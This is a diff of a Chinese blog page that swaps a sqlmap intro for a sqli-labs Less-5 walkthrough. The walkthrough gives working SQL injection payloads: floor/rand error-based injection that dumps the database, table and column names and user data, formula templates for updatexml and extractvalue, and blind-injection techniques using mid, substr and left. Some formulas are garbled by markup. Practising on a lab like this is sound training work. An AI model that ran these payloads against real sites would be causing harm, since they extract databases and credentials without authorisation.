@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>sqlmap |  云芽的博客</title>
+      <title>Less-5~Less-6 |  云芽的博客</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -66,7 +66,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-ctf工具安装/sqlmap"
+  id="post-sqli-labs通关指南/Less-5~Less-6"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -77,7 +77,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  sqlmap
+  Less-5~Less-6
 </h1>
  
 
@@ -85,11 +85,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/10/31/ctf%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/sqlmap/" class="article-date">
-  <time datetime="2021-10-31T07:30:36.000Z" itemprop="datePublished">2021-10-31</time>
+      <a href="/2021/10/19/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-5~Less-6/" class="article-date">
+  <time datetime="2021-10-18T16:59:33.000Z" itemprop="datePublished">2021-10-19</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/">工具安装指南</a>
+    <a class="article-category-link" href="/categories/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/">sqli-labs通关指南</a>
   </div>
   
 <div class="word_count">
@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">537</span>
+            <span class="post-count">1.2k</span>
         </span>
     </span>
 
@@ -106,7 +106,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">5 min</span>
         </span>
     </span>
 </div>
@@ -121,31 +121,112 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>注：后续使用到该工具时会再进行补充</p>
-<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并获取数据库服务器的权限。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。带外连接。目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是：</p>
-<p>   1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>   2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>   3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>   4）联合查询注入，可以使用union的情况下的注入。<br>   5）堆查询注入，可以同时执行多条语句的执行时的注入。</p>
-<p>在CTF的Web类型的题目中经常会遇到注入类型的题目 。如果题目比较简单，甚至可以直接用sqlmap得到flag。但是，一般的题目还是需要进行绕过操作的，比如绕过空格或关键字检测等，这时候则可以调用sqlmap的一些Tamper, 或者自行编写Tamper来进行绕过，从而得到flag。Tamper通常用来绕过-些过滤或者WAF，Tamper脚本存放在Sqlmap目录下的tamper目录中。</p>
-<h4 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h4><p>注：</p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
-<p>下载源代码后解压打开文件夹，在有salmap.py文件的路径栏输入cmd进入命令窗口，再输入python sqlmap.py命令，如下图所示：</p>
-<img src="/source/images/sqlmap/image-20211031160307403.png" alt="image-20211031160307403" style="zoom:45%;" />
+  <h3 id="Less-5-待重写"><a href="#Less-5-待重写" class="headerlink" title="Less-5(待重写)"></a>Less-5(待重写)</h3><p>题目：</p>
+<img src="/source/images/Less-5/image-20211009151746244.png" alt="image-20211009151746244" style="zoom:33%;" />
 
-<p>若输入python sqlmap.py命令显示如下，则说明系统已经将python细分，此时需要变为python3 sqlmap.py等：</p>
-<img src="/source/images/sqlmap/image-20211031160809219.png" alt="image-20211031160809219" style="zoom:50%;" />
+<p>解题：</p>
+<p>用?id=1’测试以下闭合情况，发现已经闭合：</p>
+<img src="/source/images/Less-5/image-20211013132937733.png" alt="image-20211013132937733" style="zoom:33%;" />
+
+<p>用order by测试发现正确是回显：You are in …而不会返回数据，错误时返回报错信息，此为一道<strong>盲注题</strong>：</p>
+<img src="/source/images/Less-5/image-20211013133159986.png" alt="image-20211013133159986" style="zoom:33%;" />
+
+<img src="/source/images/Less-5/image-20211013133250117.png" alt="image-20211013133250117" style="zoom:33%;" />
+
+<p>方法一：利用floor<strong>报错注入</strong>一次性爆破数据</p>
+<p><strong>爆库</strong>：</p>
+<pre><code>?id=-1&#39; union select 1,count(*),concat((database()),floor(rand()*2))x from information_schema.tables group by x--+
+</code></pre>
+<p>第一次点击无报错：</p>
+<img src="/source/images/Less-5/image-20211019151934512.png" alt="image-20211019151934512" style="zoom:33%;" />
+
+<p>再点击一次爆出库名：</p>
+<img src="/source/images/Less-5/image-20211019144039404.png" alt="image-20211019144039404" style="zoom:33%;" />
+
+<p>less-5的题目为Double Injection（双查询注入/二次查询注入）</p>
+<p>双查询注入其实就是一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询，例如：</p>
+<pre><code>select concat((select database()));
+</code></pre>
+<p><strong>爆表</strong>：（疑惑点：limit0，1）</p>
+<pre><code>?id=-1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2))x from information_schema.tables group by x --+
+</code></pre>
+<p>该语句将输出字符长度限制为64个字符</p>
+<img src="/source/images/Less-5/image-20211019152722321.png" alt="image-20211019152722321" style="zoom:33%;" />
+
+<pre><code>?id=-1&#39; union select 1,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor(rand()*2))x from information_schema.tables group by x --+
+</code></pre>
+<img src="/source/images/Less-5/image-20211019153335333.png" alt="image-20211019153335333" style="zoom:33%;" />
+
+<p><strong>爆字段</strong>：</p>
+<pre><code class="group">?id=-1&#39; union select 1,count(*),concat((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 0,1),floor(rand()*2))x from information_schema.columns group by x --+
+</code></pre>
+<img src="/source/images/Less-5/image-20211019215726664.png" alt="image-20211019215726664" style="zoom:33%;" />
+
+<p><strong>爆字段数据</strong>：</p>
+<pre><code>?id=-1&#39; union select 1,count(*),concat((select group_concat(username) from security.users limit 0,1),floor(rand()*2))x from security.users group by x --+
+</code></pre>
+<img src="/source/images/Less-5/image-20211021002223589.png" alt="image-20211021002223589" style="zoom:33%;" />
 
 
 
+<p>问题：正常回显而无报错。删除group_concat后可以随机逐个回显。</p>
+<img src="/source/images/Less-5/image-20211021002629311.png" alt="image-20211021002629311" style="zoom:33%;" />
 
+<p>原因：在使用floor()、rand(0)、count()、group by时，数据表中至少要有3条记录才会报错</p>
+<h3 id="补充（报错注入）"><a href="#补充（报错注入）" class="headerlink" title="补充（报错注入）"></a>补充（报错注入）</h3><p>三种报错注入函数：</p>
+<p>报错注入的概念：</p>
+<p>(1). 通过floor报错 and (select 1 from (select count(*),concat((<br>payload),floor (rand(0)*2))x from information_schema.tables group by</p>
+<p>x)a) 其中payload为你要插入的SQL语句 需要注意的是该语句将输出字符长度限制为64个字符</p>
+<p>(2). 通过updatexml报错 and updatexml(1, payload,1)</p>
+<p>同样该语句对输出的字符长度也做了限制，其最长输出32位,并且该语句对payload的反悔类型也做了限制，只有</p>
+<p>在payload返回的不是xml格式才会生效.</p>
+<p>(3). 通过extractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。</p>
+<ol>
+<li>floor()是取整函数。</li>
+</ol>
+<p>注入公式（Payload为自己想获取内容的脚本）：<br>and(select 1 from (select count(*),concat(concat(payload),floor(rand(0)<em>2))x from information_schema.tables group by x)y)<br>and(select 1 from (select count(</em>),concat(concat(database(),0x7e),floor(rand(0)<em>2))x from information_schema.tables group by x)y)<br>//暴库<br>and(select 1 from (select count(</em>),concat(concat((select concat(table_name) from information_schema.tables where table_schema=”security” limit 3,1),0x7e),floor(rand(0)<em>2))x from information_schema.tables group by x)y)<br>//查询表<br>and(select 1 from (select count(</em>),concat(concat((select concat(column_name) from information_schema.columns where table_schema=”security” and table_name=”users” limit 1,1),0x7e),floor(rand(0)<em>2))x from information_schema.tables group by x)y)<br>//查询字段<br>and(select 1 from (select count(</em>),concat(concat((select concat(username,0x7e,password,0x7e) from security.users limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)<br>//查询字段内容</p>
+<p>方法二：利用<strong>盲注</strong>一个个字符确定</p>
+<p>使用left()爆基本信息：</p>
+<p>根据前几道题，我们猜测数据库为security：（也可以利用bp爆破）</p>
+<img src="/source/images/Less-5/image-20211013133823635.png" alt="image-20211013133823635" style="zoom:33%;" />
 
+<img src="/source/images/Less-5/image-20211013133738477.png" alt="image-20211013133738477" style="zoom:33%;" />
 
-
-
-
-
-
-
-
- 
+<h3 id="补充（盲注）"><a href="#补充（盲注）" class="headerlink" title="补充（盲注）"></a>补充（盲注）</h3><p><strong>截取字符串</strong></p>
+<p>sql注入截取字符串常用函数有三大法宝：mid(),substr(),left()</p>
+<ol>
+<li>mid()函数：MID(column_name,start[,length])</li>
+</ol>
+<p>如： str=”123456″   mid(str,2,1) 结果为2——从第二位开始截取一位，即截取第二位</p>
+<p>Sql用例：</p>
+<blockquote>
+<p>（1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p>
+<p>（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T  table_schema=0xxxxxxx LIMIT  0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
+</blockquote>
+<ol start="2">
+<li>substr()函数</li>
+</ol>
+<p>substr()和substring()函数实现的功能是一样的，均为截取字符串。</p>
+<p>string substring(string, start, length)</p>
+<p>string substr(string, start, length)</p>
+<p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p>
+<p>Sql用例：</p>
+<blockquote>
+<p>(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</p>
+<p>(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES  WHERE T table_schema=0xxxxxxx LIMIT  0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
+</blockquote>
+<ol start="3">
+<li>Left()函数</li>
+</ol>
+<p>Left()得到字符串左边指定个数的字符</p>
+<p>Left ( string, n ) string为要截取的字符串，n为长度。</p>
+<p>Sql用例：</p>
+<blockquote>
+<p>(1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。</p>
+<p>(2) 同样的string可以为自行构造的sql语句。</p>
+</blockquote>
+<p><strong>参考链接：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5504374.htm">http://www.cnblogs.com/lcamry/p/5504374.htm</a></strong></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3> 
       <!-- reward -->
       
       <div id="reword-out">
@@ -215,7 +296,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/10/31/ctf%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/sqlmap/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/10/19/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-5~Less-6/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -226,19 +307,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/11/04/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-7/" class="article-nav-link">
+      <a href="/2021/10/21/ctf%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/MySQL/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            Less-7
+            MySQL
           
         </div>
       </a>
     
     
-      <a href="/2021/10/30/ctf%E8%A7%A3%E9%A2%98/bugctf-web/" class="article-nav-link">
+      <a href="/2021/10/06/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-1~Less-4/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">bugctf-web</div>
+        <div class="article-nav-title">Less-1~Less-4</div>
       </a>
     
   </nav>
